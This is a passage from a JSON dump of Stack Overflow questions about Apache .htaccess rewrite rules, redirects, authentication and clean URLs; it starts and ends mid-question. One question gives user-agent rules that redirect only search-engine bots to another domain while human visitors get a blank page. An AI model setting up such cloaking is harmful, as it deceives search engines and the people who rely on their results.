!^/zencarttest/zencart/editors/ [NC]\n\n# Handle all other URIs using Zen Cart (its index.php)\nRewriteRule .* /zencarttest/zencart/index.php [QSA,L]\n\n## END CEON URI MAPPING REWRITE RULE\n</code></pre>\n\n<p>Where did I make a mistake??</p>\n\n<p>Please help me! Thanks in advance...  </p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12897185,"title":"Use mod_rewrite to take part of the subdomain and append it to the url","body":"<p>Is it possible to use <strong>mod_rewrite</strong> to take part of the subdomain from url and append it to the url?</p>\n\n<p>This is the current url, where i have multiple subdomains one for each customer:</p>\n\n<pre><code>customername.subdomain.domain.co.uk\n</code></pre>\n\n<p>which I am going to point to a new server and new site. The new url format is:</p>\n\n<pre><code>http://domain/login/customername\n</code></pre>\n\n<p>as all customer are now all under one site.</p>\n\n<p>So what i trying to do is use mod_rewrite to take the whatever before <code>.subdomain</code> and put it at the end of <code>https://domain/login/customername</code></p>\n\n<p>This is what i have got so far:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteCond %{HTTP_HOST} ^([a-z0-9]+).subdomain.domain(.*)$ [NC] \nRewriteCond %{REQUEST_URI} $1/   \nRewriteRule ^(.*)$ https://domain/login/$1 [L]\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":122,"score":0,"question_id":5121588,"title":"How to allow server to access files but not user?","body":"<p>I have a directory with a bunch of files in it &amp; I don't want anybody to be able to access these files by either getting a directory listing or by guessing the file location &amp; typing it in.... it should NOT allow them to download it.</p>\n\n<p>I accomplished this by putting the below in my .htaccess file:</p>\n\n<pre><code>Options -Indexes\n\nOrder Allow,Deny\nDeny from all\n</code></pre>\n\n<p>However, I want the user to be able to download the file ONLY IF they access it via a script (which is in a different directory) which will give them the download. At the moment with the above settings it doesn't work.</p>\n\n<p>I thought of putting something like..</p>\n\n<pre><code>Allow from domain.com\n</code></pre>\n\n<p>But I'm not 100% sure what that means? Does that check where the REQUEST is coming from &amp; hence it would work if the server requests access to that dir? ...or would it still not work as the user is still using the domain via the other script to access the dir?</p>\n"},{"tags":[".htaccess",".htpasswd"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12911437,"title":"Directory authentication not working","body":"<p>This is my htaccess file in the directory <code>/home/domain.nl/public_html/helpdesk</code></p>\n\n<pre><code>Require user agent8 agent9 agent10 \nAuthType     Basic\nAuthName     this_protected_area\nAuthUserFile /home/domain.nl/public_html/.htpasswd\n</code></pre>\n\n<p>But when I go to domain.nl/helpdesk I got a 324 error (ERR_EMPTY_RESPONSE). So whats wrong? I'm sure the htpasswd file is on the correct location.</p>\n\n<p>In the error logs I see this error:</p>\n\n<pre><code>(13)Permission denied: Couldn't read /home/domain.nl/public_html/errors/.htaccess, closing connection.\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1994,"score":0,"question_id":1249535,"title":".htaccess allow script access within my domain","body":"<p>I am looking for the specific .htaccess command that will allow me to deny http access from everyone BUT my scripts.</p>\n\n<p>I have a script that runs out of the root directory that goes and fetches all of the .jpg's out of a given protected directory with the following .htaccess file</p>\n\n<pre><code>&lt;files *.jpg&gt;\n    order allow, deny\n    deny from all\n&lt;/files&gt;\n</code></pre>\n\n<p>I was thinking something similar to this might work</p>\n\n<pre><code>&lt;files *.jpg&gt;\n  order allow, deny\n  deny from all\n  allow from rootUrl.com\n&lt;/files&gt;\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12910482,"title":".htaccess is working on localhost, but not working on server","body":"<p>my URL is <a href=\"http://www.mydomain.com/new\" rel=\"nofollow\">http://www.mydomain.com/new</a> . following is my .htaccess.</p>\n\n<pre><code> &lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /new/\nRewriteRule   Sandcastles-about-us   aboutus.php\nRewriteRule   Sandcastles-Home   index.php\nRewriteRule   Sandcastles-Privacy-Policy   privacy.php\nRewriteRule   Sandcastles-Terms-and-Conditions   terms.php\nRewriteRule   Sandcastles-Register   register.php       \n\n RewriteRule ^([a-zA-z0-9]+)-Properties-for-([a-zA-Z0-9]+)-([a-zA-Z0-9]+)-([a-  zA-Z0-9]+).html$ properties-list.php?city=$1&amp;mode=$2&amp;page=$3&amp;filter=$4\n\n RewriteRule ^([a-zA-z0-9]+)-for-([a-zA-Z0-9]+)-in-(.*)-([0-9]+)-([0-9]+).html$ property_search_area.php?property_type=$1&amp;mode=$2&amp;location=$3&amp;page=$4&amp;filter=$5\n\n  RewriteRule ^property_details-([a-zA-z0-9]+)-([a-zA-z0-9]+).html$ property_details.php?property_id=$1&amp;mode=$2\n &lt;/IfModule&gt;\n</code></pre>\n\n<p>i have checked mod_rewrite is also enable by using the following line.</p>\n\n<p>echo in_array('mod_rewrite', apache_get_modules());</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12869961,"title":"Htaccess 301 Redirection Error","body":"<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /webfolder/index.php/$1 [L]\n</code></pre>\n\n<p>How can i redirect my url i.e. </p>\n\n<blockquote>\n  <p>www.example.com/webfolder</p>\n</blockquote>\n\n<p>to </p>\n\n<blockquote>\n  <p>example.com/webfolder/keyword</p>\n</blockquote>\n\n<p>without screwing up the above re-write?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12908691,"title":"How to create a 301 redirect in .htaccess for *.olddomain.com to *.newdomain.com","body":"<p>I've checked many ways for redirecting old domain to new domain. But I did not find any way for that.</p>\n\n<p>All my subfolder of my site is using subdomain address, such as myfolder.domain.com, so it built many many subdomains. Now I want to redirect all of them to new domain.</p>\n\n<p>redirect *.olddomain.com to *.newdomain.com. Can anybody who know .htaccess can help me with this? I'd really really appreciate it! Thanks!</p>\n"},{"tags":[".htaccess","no-www"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":93,"score":5,"question_id":11246853,"title":"Is the www subdomain good practice?","body":"<p>I know it is good practice to keep your website entirely 'http://www' or http://, and i'm also aware the www is just a subdomain.</p>\n\n<p>The main question I have is <strong>Which one of these would be the best choice</strong>? I'm configuring an htaccess for one of my servers right now, and can't decide to redirect all traffic away or toward the www subdomain. (I know how to do that by the way.)</p>\n\n<p>This is simply a best practice question. I see big guys like Google and Amazon both forward to the www subdomain, but to me it sounds unnecessary - I don't want to miss anything.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12907911,"title":"how to hide other part of URL","body":"<p>i want to hide some part of URL like this one</p>\n\n<p><strong>http://localhost/hotel/index.php?&amp;do=home</strong></p>\n\n<p>i want it to show only </p>\n\n<p><strong>http://localhost/hotel/home</strong></p>\n\n<p>can anyone give me a simpliest code in php to do that? thank you.</p>\n"},{"tags":["apache",".htaccess","apache2","no-www"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12761299,"title":"Apache2 WWW remove FAIL with .htaccess","body":"<p>I want to <strong><em>remove \"www\"</em></strong> from my domain at apache2.\nI tryed out lots of examples whiches do it with an <code>.htaccess</code> file but none of them works.\nSo here's my <code>.htacces</code> which is owned by user root with chmod 644:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} !^your-site.com$ [NC]\nRewriteRule ^(.*)$ http://your-site.com/$1 [L,R=301]\n</code></pre>\n\n<p>This is not removing the www <del>and if I type <code>http://your-site.com</code> in my browser (Firefox) it redirects me to <code>www.your-domain.com</code> stil.</del> <strong>EDIT: It was browser's fail, but prev. problem exists.</strong></p>\n\n<p>My apache2 is setted up for this main domain without <code>www.</code> already and that was my all .htaccess.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12744506,"title":".htaccess test query parameters instead of FilesMatch","body":"<p>I have the following htaccess file:</p>\n\n<pre><code>&lt;filesMatch \"\\.png$\"&gt;\n&lt;ifModule mod_headers.c&gt;\nHeader set Cache-Control \"public\"\nHeader set Content-Description \"File Transfer\"\nHeader set Content-Disposition \"attachment\"\nHeader set Content-Type \"image/png\"\nHeader set Content-Transfer-Encoding \"binary\"\n&lt;/ifModule&gt;\n&lt;/filesMatch&gt;\n</code></pre>\n\n<p>I'd like to test the %{QUERY_STRING} instead of performing a filesmatch. Is that possible?</p>\n"},{"tags":[".htaccess","url","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":49,"score":4,"question_id":12906938,"title":"How do i rewrite this url using .htaccess","body":"<p>I would like it to show the url\n<code>/index.php?page=somePage&amp;id=someID&amp;siteAddress=someAddress</code>\nas\n<code>/someAddress/?page=somePage&amp;id=someID</code>.</p>\n\n<p>How can I use the rewrite rule for this?</p>\n"},{"tags":["apache",".htaccess","pyrocms","setenv"],"answer_count":2,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":350,"score":1,"question_id":10727720,"title":"Conditional SetEnv in .htaccess?","body":"<p>Is it possible to set a SetEnv variable in an .htaccess file differently depending on hostname?</p>\n\n<p>For example, I need my <code>.htaccess</code> file to have the following value:</p>\n\n<pre><code>SetEnv PYRO_ENV production\n</code></pre>\n\n<p>On production boxes, and...</p>\n\n<pre><code>SetEnv PYRO_ENV stage\n</code></pre>\n\n<p>On staging boxes. The <code>.htaccess</code> file is version controlled, which is the reason I'm looking for a conditional solution.</p>\n"},{"tags":["php","mysql",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12905604,"title":"301 redirect an entire folder but keep dynamic urls intact","body":"<p>I have a directory that was mislabeled.</p>\n\n<p>Example:  www.example.com/badfolder</p>\n\n<p>It should've been:  www.example.com/goodfolder</p>\n\n<p>Within the directory, there are tons of dynamic urls and friendly urls.</p>\n\n<p>I'd like to put a line in my .htaccess file in the public_html folder that redirects to the new folder.</p>\n\n<p>Therefore, it someone was navigating to:  www.example.com/badfolder/page.php?id=123&amp;x=5&amp;y=10</p>\n\n<p>It would redirect to:  www.example.com/goodfolder/page.php?id=123&amp;x=5&amp;y=10</p>\n\n<p>Is this correct?</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^badfolder/(.*)?$ /goodfolder/$1 [R=301,NC,NE,L]\n</code></pre>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12905155,"title":"htaccess adding query string to 301 redirect","body":"<p>Can sombody help me out with this, im trying to re direct a page using htaccess file but it keeps adding <code>?c=oldpage</code> on to the end of the new url, example:</p>\n\n<pre><code>http://www.mydomain.co.uk/newpage.html?c=oldpage\n</code></pre>\n\n<p>i have tried some of the solutions posted here but no luck, here is my <em><code>.htaccess</code></em> file:</p>\n\n<pre><code>DirectoryIndex index.php index.html index.htm    \nOptions +FollowSymLinks    \nRewriteEngine on    \nRewriteCond %{QUERY_STRING} PHPSESSID=.*$    \nRewriteRule (.*) http://www.mydomain.co.uk/$1? [R=301,L]    \nRewriteCond %{HTTP_HOST} ^mydomain.co.uk$ [NC]    \nRewriteRule ^(.*)$ http://www.mydomain.co.uk/$1 [R=301,L]    \nRewriteCond %{THE_REQUEST} /index\\.php\\ HTTP/    \nRewriteRule ^index\\.php$ / [R=301,L]    \nRewriteEngine on    \nRewriteRule ^product/(.*).html$ product.php?p=$1 [L]    \nRewriteRule ^(.*)\\.html$ category.php?c=$1 [L,NC]        \n\nRedirect 301 /oldpage.html http://www.mydomain.co.uk/newpage.html    \n\nErrorDocument 404 /404.php\n</code></pre>\n\n<p>Thanks for any help.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12904684,"title":"htaccess 301 redirection for the bots","body":"<p>I need help in .httaccess rewrite rule. One of my client says \"A website abc.com should send traffic (with 301 redirect) from google, bing and yahoo search engigne bots only to cba.com otherwise show index.html (its a white page) i.e if Google robot is crawling abc.com  it should see a redirect to bcd.com instead of the real content\".</p>\n\n<p>is this possible like this?</p>\n\n<pre><code>RewriteEngine On \nRewriteCond %{HTTP_USER_AGENT} Googlebot [OR]\nRewriteCond %{HTTP_USER_AGENT} msnbot [OR]\nRewriteCond %{HTTP_USER_AGENT} Slurp\nRewriteRule ^(.*)$ http://bcd.com/$1 [L,R=301]\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess","mod","urlfetch"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":112,"score":0,"question_id":12894435,"title":"data from htaccess","body":"<p>i want to fetch all data from htaccess i know it is stupid type of question\nbut i just wanted to know whether it is possible to get only user-friendly links from list of htaccess rules </p>\n\n<pre><code>RewriteRule ^login$ common/login.php [L]\nRewriteRule ^forgot-password$ common/forgotpassword.php [L]\nRewriteRule ^page/(.*)$ common/page_content.php?pageslug=$1 [L]\nRewriteRule ^activate/([a-zA-Z]+)/([0-9]+)/(.*)$ common/activate.php?type=$1&amp;userid=$2&amp;activationcode=$3 [L]\nRewriteRule ^forgot-password$ common/forgotpassword.php [L]\n</code></pre>\n\n<p>i want this data in format as</p>\n\n<pre><code>$data-&gt;array(); //is array\n$data[0] = login common/login.php \n$data[1] = forgotpassword common/forgotpassword.php or simlar to this \n</code></pre>\n\n<p>or please suggest me some way to get all tags inside my site along with their path names\ni want to build my site-map dynamically based on htaccess</p>\n"},{"tags":["wordpress",".htaccess","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12868074,"title":"Trying to figure out why the files on my server are all having a directory appended to them","body":"<p>Here's my rewrite rules. I don't know htaccess very well, so I am trying to puzzle it out:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /domainname/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>Now, the site works fine as a whole, and has absolutely no /domainname/ anywhere visible in either the directory structure OR the url.</p>\n\n<p>However, there are multiple images on a page inside the /wp-content directory. These are being linked to, but the /domainname/ is being appended to them, as follows:</p>\n\n<pre><code>www.domainname.com/domainname/wp-content/uploads/filename.jpg\n</code></pre>\n\n<p>I want the rest of the site to work, which doesn't when I remove rewrite base - however I also want these images to work, and I assume they won't work unless I remove that base - so how do I fix this?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","nginx"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2797,"score":1,"question_id":2442374,"title":"Converting Mod-rewrite rules which use %(QUERY_STRING) to NGINX rewrite format?","body":"<p>I've been stuck the last few days trying to convert the following Apache/Mod_Rewrite rewrite rule to NGINX format. Anyone know where I am going wrong?</p>\n\n<p>MOD_REWRITE:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} topic=([0-9]+)\nRewriteRule /forum/index\\.php /forum/vbseo301.php?action=thread&amp;oldid=%1 [L]\n</code></pre>\n\n<p>NGINX:</p>\n\n<pre><code>location /forum/index.php {\n           if ($args ~ \"topic=([0-9]+)\"){\n                        rewrite ^/forum/index\\.php?topic=(.+)$ /forum/vbseo301.php?action=thread&amp;oldid=$1 last;\n                        }\n        }\n</code></pre>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite","website"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12673496,"title":"Codeigniter htaccess index.php site down","body":"<p>Codeigniter htaccess started problem suddenly even when no changes were made to any files. I can access</p>\n\n<ul>\n<li>www.mysite.com/index.php/controller/method</li>\n</ul>\n\n<p>but when I access </p>\n\n<ul>\n<li>www.mysite.com/controller/method</li>\n</ul>\n\n<p>it gives a general 404, not a codeigniter 404. Any help is appreciated. The site is down.</p>\n\n<p>Here is my present htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n #Removes access to the system folder by users.\n #Additionally this will allow you to create a System.php controller,\n #previously this would not have been possible.\n #'system' can be replaced if you have renamed your system folder.\n RewriteCond %{REQUEST_URI} ^system.*\n RewriteRule ^(.*)$ /index.php/$1 [L]\n\n #Checks to see if the user is attempting to access a valid file,\n #such as an image or css document, if this isn't true it sends the\n #request to index.php\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n #This last condition enables access to the images and css folders, and the robots.txt file \n#Submitted by Michael Radlmaier (mradlmaier)\n RewriteCond $1 !^(index\\.php|images|robots\\.txt|css)\n RewriteRule ^(.*)$ index.php/$1 [L]\n &lt;/IfModule&gt;\n\n &lt;IfModule !mod_rewrite.c&gt;\n # If we don't have mod_rewrite installed, all 404's\n # can be sent to index.php, and everything works as normal.\n # Submitted by: ElliotHaughin\n\n ErrorDocument 404 /index.php\n &lt;/IfModule&gt; \n</code></pre>\n"},{"tags":["php","html","ajax",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12902087,"title":"how to link to a div without #","body":"<p>I currently have a responsive website design that has all the content in index.php and only shows the selected div according to which page is being viewed. The menu tabs are just link to the different \"pages\" (div's) as #blog for example.</p>\n\n<p>I would like to have \"Real\" links to each separate page so i can have www.example.com/blog link directly to my blog instead of www.example.com/#blog</p>\n\n<p>.htaccess? ajax? separate all my content into their own .html and have index.php load them according to whichever page is requested?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12893824,"title":"Simple RewriteRule for first directory","body":"<p>This is pretty basic but I can't find a solution that works. I just need to redirect any URLs from an old directory to a new URL.</p>\n\n<p>Example:</p>\n\n<pre><code>/search/whatever\n</code></pre>\n\n<p>to</p>\n\n<pre><code>/jobs/search\n</code></pre>\n\n<p>I don't need to map the whatever, I want all traffic to a URL that begins /search to get redirected (301).</p>\n\n<p>Using this:</p>\n\n<pre><code>RewriteRule /search /jobs [R=301,L]\n</code></pre>\n\n<p>Works but I have a URL within /jobs that also now gets redirected:</p>\n\n<pre><code>/jobs/search\n</code></pre>\n\n<p>And that's wrong - it needs to match the start of the URL. So I tried this:</p>\n\n<pre><code>RewriteRule ^/search /jobs [R=301,L]\n</code></pre>\n\n<p>But that doesn't redirect at all, so I'm stuck.</p>\n\n<p>Another example would be this:</p>\n\n<p>RewriteRule /careers-at-pure /emea/contact-us/careers-at-pure [R=301,L]</p>\n\n<p>This creates a loop as careers-at-pure is in the old and new URLs, but the following doesn't get matched and redirected:</p>\n\n<p>RewriteRule ^/careers-at-pure /emea/contact-us/careers-at-pure [R=301,L]</p>\n\n<p>Any suggestions?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12901438,"title":".htaccess slicing first two characters from GET for forwarding path","body":"<p>Hey guys I got a tricky one here, but I believe it will allow me to bypass the need for a PHP controller file for forwarding. I have a url that I hit <code>example.com/</code> if it has no following sequence, it will route like this</p>\n\n<pre><code>#example.com\nRewriteCond %{HTTP_HOST} ^(www\\.)?example\\.com [NC]\nRewriteRule ^$ http://www\\.example2\\.com/?CampID=dm/DMdefault [R=301,L]\n</code></pre>\n\n<p>The question is the second redirect. If I want to slice the first two (alphanum) as one part of the forwarding url, and the next five as the second part, would this work?</p>\n\n<pre><code>RewriteMap  lc int:tolower\nRewriteCond %{HTTP_HOST} ^(www\\.)?example\\.com [NC]\nRewriteRule ^(\\w{2})(\\w{5})$ http://www\\.example2\\.com/landing/external-marketing/direct-mail/${lc:$1}?CampId=${lc:$1$2} [R=301,L]\n</code></pre>\n\n<p>This *should normalize case, and forward <code>http://example.com/BA025JD</code> to \n<code>http://www.example2.com/landing/external-marketing/direct-mail/ba?CampId=ba025jd</code> correct?</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12892948,"title":"htaccess redirect parameter into directory","body":"<p>I setup a slightly weird hierarchy where index reads the URI to decide the action instead of using actual subdirectories, example: site.com/base/action/</p>\n\n<p>Im moving over from the old system to this new one, but I cant get the redirects to work. What I need is: /base/?param[]=value to do an external redirect to /base/param/value/</p>\n"},{"tags":[".htaccess","drupal-7","clean-urls"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":996,"score":0,"question_id":9652193,"title":"Clean URLS/.htaccess","body":"<pre><code>&lt;IfModule mod_rewrite.c&gt;\n RewriteEngine on\n RewriteBase /\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n RewriteRule ^(.*)$ index.php?q=$1 [L,QSA\n</code></pre>\n\n<p>Looking for feedback</p>\n\n<p>Goal: I am trying to enable \"Clean URLs\" on a Drupal 7 site (such that example.com/?q=user resolves to example.com/user).</p>\n\n<p>I've just spent way too long pouring through official Drupal docs and comments, to no avail, so any suggestions are greatly appreciated!</p>\n\n<p>I have checked the box \"Enable Clean URLs\" in Drupal (/admin/config/search/clean-urls) and got the all-clear that the configuration options were saved. So now I am actually able to go to example.com/user and it does indeed display the same content as example.com/?q=user. What I want, however, is for example.com/?q=user to be rewritten in the URI as example.com/user.</p>\n\n<p>The relevant .htaccess code is shown above, and my Apache conf appears to be properly configured.</p>\n"},{"tags":["php",".htaccess","imagemagick","gd","gravatar"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12900977,"title":"How can I grab an image from another site using PHP or .htaccess?","body":"<p>Ok, here is what I'm trying to do.</p>\n\n<p>On my site, I have a set of images I've uploaded to use as my avatar. Those sites usually asks for different sizes and are very picky to what kind of URLs they accept.</p>\n\n<p>What I'm trying to do is to get a Gravatar image, from the Gravatar server, and serve it using a customized URL, on the fly or with cache.</p>\n\n<p>My Gravatar URL for an image 100x100px:</p>\n\n<pre><code>http://gravatar.com/avatar/b6e428090e62182266a4e9dd87297ee1.png?s=100\n</code></pre>\n\n<p>What I want to offer to websites, more or less:</p>\n\n<pre><code>http://alenonimo.com.br/avatar/avatar100.png\n</code></pre>\n\n<p>Now let me explain the issue I'm trying to solve here, because it's interesting.</p>\n\n<p>Some sites accepts third party URLs for avatar images, like phpBB and the like. They also have different sizes they prefer, like 100x100 pixels, 120x120 pixels, 200x200 pixels, etc. Yet, they refuse to accept the Gravatar URL if it comes with the \"s\" variable on the URL, which defines the size of the images served from Gravatar. The default size is always 80x80 pixels without the option.</p>\n\n<p>So I want to serve those sites the Gravatar images and defining the size on the URL, in a way it doesn't notice that's coming from Gravatar's image generator. I want those sites to think the image actually comes from my website. It would allow me to set the size for those sites that doesn't accept Gravatar and luckily allow me to change all the avatar images on all those sites at once by just going to Gravatar.</p>\n\n<p>I'm pretty sure it could be done using Apache's RewriteEngine, yet I lack the code-fu to do it. All the examples that I've found on the net regards redirecting content from the same site to somewhere else on the same site, which is not the case. I also wanted to make sure the size attribute would be a more or less valid number, instead of accepting anything. So a file called \"100.png\" would be okay but \"banana.png\" would not.</p>\n\n<p>This for itself would be interesting but it occured me another thing. What if the site doesn't accept PNG files but accept JPG or GIF files? Probably wouldn't happen on sites which just show images but it would be interesting for me if I also could offer images to sites which uploads from URLs too. Also, maybe making sure something shows up even if Gravatar goes offline would be interesting too, like a cache system. That could be achievable with PHP but I'm not sure how complicated it would be.</p>\n\n<p>Could someone help me with the RewriteEngine rules? Or even giving me some pointer on how to make this PHP script? Would it be interesting to someone else in here?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":127,"score":0,"question_id":10706737,"title":"Remove the file extension .php using htaccess file","body":"<p>I want to remove the .php from the url through htaccess file. for example home.php to home\nI'm using the following rewrite rule in htaccess file. </p>\n\n<pre><code>    RewriteRule ^(([^/]+/)*[^.]+)$ /$1.php [L]\n</code></pre>\n\n<p>I also want to assign the login as index.\nHow can I change it.</p>\n"},{"tags":["php","apache",".htaccess","hotlinking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":46,"score":-1,"question_id":12897069,"title":"Prevent hotlinking specific files with htaccess","body":"<p>How can I prevent hotlinking specific files from other sites?<br>\nLets say <code>mydomain.com/file1.zip</code> and <code>mydomain.com/file2.zip</code> - I would like to redirect them to pages <code>mydomain.com/file1page</code> and <code>mydomain.com/file2page</code>.<br>\nI want to prevent only those 2 of hotlinking not all the zip files.</p>\n"}]}
{"total":14527,"page":9,"pagesize":100,"questions":[{"tags":["php",".htaccess","web-config"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":59,"score":-6,"question_id":12900181,"title":"i want to convert .htaccess to web.config on iis","body":"<p>hi frds i have an application that normally worked on apachae server now i want to install it in windows server i already done that but nw my search engine friendly url not working i want to convert its .htacess </p>\n\n<pre><code>  &lt;IfModule mod_rewrite.c&gt;\n        RewriteEngine On\n        RewriteRule ^scripts - [L] \n        RewriteRule (.*)\\.html$ news.php?name=$1\n        RewriteRule (.*)\\.htm$ categories.php?id=$1\n&lt;/IfModule&gt;\n&lt;ifModule mod_expires.c&gt;\n&lt;filesMatch \"\\.(ico|flv)$\"&gt;\nHeader set Cache-Control \"max-age=29030400, public\"\n&lt;/filesMatch&gt;\n&lt;filesMatch \"\\.(jpg|jpeg|png|gif|swf)$\"&gt;\nHeader set Cache-Control \"max-age=604800, public\"\n&lt;/filesMatch&gt;\n&lt;filesMatch \"\\.(xml|txt|css|js)$\"&gt;\nHeader set Cache-Control \"max-age=172800, proxy-revalidate\"\n&lt;/filesMatch&gt;\n&lt;filesMatch \"\\.(html|htm|php)$\"&gt;\nHeader set Cache-Control \"max-age=60, private, proxy-revalidate\"\n&lt;/filesMatch&gt;\n&lt;/ifModule&gt;\n</code></pre>\n\n<p>`</p>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12899645,"title":"URL rewrite not working for one URL","body":"<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\n\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\nRewriteRule ^foo$ /bar [L,R=301]\n\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>Those lines are working for wordpress but <code>RewriteRule ^foo$ /bar [L,R=301]</code> is not redirecting when I open <code>www.example.com/foo</code></p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":147,"score":2,"question_id":9989123,"title":".htaccess to combine files","body":"<p>I found the following htacess that allows concatenation from within specific js files</p>\n\n<pre><code>&lt;FilesMatch \"\\.combined\\.js$\"&gt;\n  Options +Includes\n  AddOutputFilterByType INCLUDES application/javascript application/json\n  SetOutputFilter INCLUDES\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>e.g. Inside of script.combined.js you could have</p>\n\n<pre><code> &lt; !--#include file=\"libs/jquery-1.5.0.min.js\" --&gt;\n &lt; !--#include file=\"plugins/jquery.idletimer.js\" --&gt;\n</code></pre>\n\n<p>and they would be included into this single file.</p>\n\n<p>I want to know how do these two line  -  line 2 n 3 of the .htaccess combine files. </p>\n\n<p>Also these have worked on several systems but on my ubuntu 12.04 with Apache 2.2.22 they don't work. why?</p>\n"},{"tags":[".htaccess","redirect","rewrite","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12882634,"title":"Redirect internal links to subdirectory with .htaccess (for test site)","body":"<p>Have looked for an answer for a while here but nothing works so far. Basically a site has been installed in a subdirectory of web root, but all the internal links point to the web root, as this is how it is set up on the live site. Is there an htaccess rule to redirect all internal links to the subdirectory, or another way of making the links work?</p>\n"},{"tags":["php",".htaccess","post","redirect","internal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3456,"score":0,"question_id":1563666,"title":"How Do I make a simple .htaccess internal redirect Catch All script while forwarding POST data?","body":"<p>I just want to catch all requests and forward them internally to my catchall page with all POST data intact</p>\n\n<p>Catch all page:\n<a href=\"http://www.mydomain.com/addons/redirect/catch-all.php\" rel=\"nofollow\">http://www.mydomain.com/addons/redirect/catch-all.php</a></p>\n\n<p>I've tried so many combinations, but my server doesn't want to redirect internally if I 